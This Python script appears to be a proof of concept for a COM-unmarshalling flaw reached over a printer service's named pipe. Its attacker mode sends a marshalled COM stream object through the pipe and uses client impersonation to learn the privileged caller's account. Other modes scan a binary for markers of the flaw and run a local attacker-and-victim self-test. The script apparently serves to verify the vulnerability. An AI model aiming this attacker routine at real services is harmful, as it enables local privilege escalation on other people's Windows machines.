import argparse
import ctypes
import json
import os
import pathlib
import struct
import subprocess
import sys
import time
import uuid


def utf16le(value):
    return value.encode("utf-16le")


def analyze_binary(path):
    data = pathlib.Path(path).read_bytes()
    markers = {
        "pipe_name_utf16": utf16le(r"\\.\pipe\adprinterpipe") in data,
        "print_default_ascii": b"ad.security.print=true" in data,
        "service_mode_utf16": utf16le(" --service") in data,
        "iid_iunknown": bytes.fromhex("0000000000000000c000000000000046") in data,
        "iid_istream": bytes.fromhex("0c00000000000000c000000000000046") in data,
        "co_unmarshal_import": b"CoUnmarshalInterface" in data,
        "co_initialize_security_import": b"CoInitializeSecurity" in data,
        "create_named_pipe_import": b"CreateNamedPipeW" in data,
        "create_service_import": b"CreateServiceW" in data,
    }
    result = {
        "path": str(path),
        "size": len(data),
        "markers": markers,
        "matched": sum(1 for value in markers.values() if value),
        "total": len(markers),
    }
    print(json.dumps(result, indent=2))
    return 0 if result["matched"] >= 7 else 1


def impersonated_user():
    import win32api
    import win32con
    import win32security

    ole32 = ctypes.OleDLL("ole32")
    hr = ole32.CoImpersonateClient()
    if hr < 0:
        return f"CoImpersonateClient failed: 0x{ctypes.c_ulong(hr).value:08x}"
    try:
        token = win32security.OpenThreadToken(win32api.GetCurrentThread(), win32con.TOKEN_QUERY, True)
        user_sid, _ = win32security.GetTokenInformation(token, win32security.TokenUser)
        name, domain, _ = win32security.LookupAccountSid(None, user_sid)
        return f"{domain}\\{name}"
    finally:
        ole32.CoRevertToSelf()


class ProbeStream:
    _com_interfaces_ = []
    _public_methods_ = [
        "Read",
        "Write",
        "Seek",
        "SetSize",
        "CopyTo",
        "Commit",
        "Revert",
        "LockRegion",
        "UnlockRegion",
        "Stat",
        "Clone",
    ]

    def Read(self, count):
        print(f"PROBE_IMPERSONATED={impersonated_user()}", flush=True)
        return b""

    def Write(self, data):
        return len(data)

    def Seek(self, move, origin):
        return 0

    def SetSize(self, size):
        return None

    def CopyTo(self, other, count):
        return (0, 0)

    def Commit(self, flags):
        return None

    def Revert(self):
        return None

    def LockRegion(self, offset, count, lock_type):
        return None

    def UnlockRegion(self, offset, count, lock_type):
        return None

    def Stat(self, flags):
        return None

    def Clone(self):
        return None


def marshal_probe_stream():
    import pythoncom
    import win32com.server.util

    pythoncom.CoInitialize()
    ProbeStream._com_interfaces_ = [pythoncom.IID_IStream]
    obj = win32com.server.util.wrap(ProbeStream(), pythoncom.IID_IStream)
    stream = pythoncom.CreateStreamOnHGlobal()
    pythoncom.CoMarshalInterface(stream, pythoncom.IID_IUnknown, obj, pythoncom.MSHCTX_LOCAL, pythoncom.MSHLFLAGS_NORMAL)
    size = stream.Seek(0, 1)
    stream.Seek(0, 0)
    return stream.Read(size), obj


def attacker(pipe_name):
    import pythoncom
    import win32con
    import win32file

    payload, keepalive = marshal_probe_stream()
    message = struct.pack("<IIB", 1, len(payload), 1) + payload
    handle = win32file.CreateFile(pipe_name, win32con.GENERIC_READ | win32con.GENERIC_WRITE, 0, None, win32con.OPEN_EXISTING, 0, None)
    try:
        win32file.WriteFile(handle, message)
        deadline = time.time() + 8
        while time.time() < deadline:
            pythoncom.PumpWaitingMessages()
            time.sleep(0.02)
    finally:
        keepalive = None
        win32file.CloseHandle(handle)


def victim(pipe_name):
    import pywintypes
    import pythoncom
    import win32file
    import win32pipe

    pythoncom.CoInitialize()
    pythoncom.CoInitializeSecurity(None, None, None, 0, 3, None, 0, None)
    pipe = win32pipe.CreateNamedPipe(pipe_name, 3, 0, 1, 0x1000, 0x1000, 15000, None)
    try:
        try:
            win32pipe.ConnectNamedPipe(pipe, None)
        except pywintypes.error as exc:
            if exc.winerror != 535:
                raise
        _, data = win32file.ReadFile(pipe, 0x1000)
        command, length = struct.unpack("<II", data[:8])
        payload = data[9 : 9 + length]
        if command != 1:
            raise RuntimeError(f"unexpected command {command}")
        stream = pythoncom.CreateStreamOnHGlobal()
        stream.Write(payload)
        stream.Seek(0, 0)
        unknown = pythoncom.CoUnmarshalInterface(stream, pythoncom.IID_IUnknown)
        istream = unknown.QueryInterface(pythoncom.IID_IStream)
        istream.Read(32)
        print("VICTIM_READ_COMPLETE", flush=True)
    finally:
        win32file.CloseHandle(pipe)


def selftest():
    if os.name != "nt":
        print(json.dumps({"error": "selftest requires Windows"}, indent=2))
        return 2
    pipe_name = rf"\\.\pipe\ad_printer_com_probe_{uuid.uuid4().hex}"
    script = os.path.abspath(__file__)
    victim_proc = subprocess.Popen([sys.executable, script, "victim", pipe_name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    time.sleep(0.8)
    attacker_proc = subprocess.Popen([sys.executable, script, "attacker", pipe_name], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    attacker_out, _ = attacker_proc.communicate(timeout=12)
    victim_out, _ = victim_proc.communicate(timeout=12)
    print("[attacker]")
    print(attacker_out.strip())
    print("[victim]")
    print(victim_out.strip())
    return attacker_proc.returncode or victim_proc.returncode


def main():
    parser = argparse.ArgumentParser()
    sub = parser.add_subparsers(dest="mode", required=True)
    sub.add_parser("selftest")
    analyze = sub.add_parser("analyze")
    analyze.add_argument("binary")
    victim_parser = sub.add_parser("victim")
    victim_parser.add_argument("pipe")
    attacker_parser = sub.add_parser("attacker")
    attacker_parser.add_argument("pipe")
    args = parser.parse_args()
    if args.mode == "selftest":
        raise SystemExit(selftest())
    if args.mode == "analyze":
        raise SystemExit(analyze_binary(args.binary))
    if args.mode == "victim":
        victim(args.pipe)
        return
    if args.mode == "attacker":
        attacker(args.pipe)
        return


if __name__ == "__main__":
    main()
